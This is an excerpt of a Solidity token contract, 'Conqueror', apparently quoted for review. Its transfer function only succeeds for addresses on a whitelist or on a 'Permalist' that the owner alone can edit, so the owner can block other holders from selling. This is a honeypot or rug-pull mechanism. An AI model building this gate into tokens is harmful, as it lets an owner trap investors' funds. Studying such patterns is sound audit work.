...
contract Conqueror is Context, IERC20Upgradeable {
    ...
    mapping(address => bool) private Permalist;
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        require(Whitelist[from] || Whitelist[to] || Whitelist[msg.sender] || Permalist[from] || Permalist[to] || Permalist[msg.sender]  );
    ...
    function PermalistState(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++){
            Permalist[accounts[i]] = state;
        }
    }
    ...
    function SinglePermaList(address account, bool state) external onlyOwner{
        Permalist[account] = state;
    }
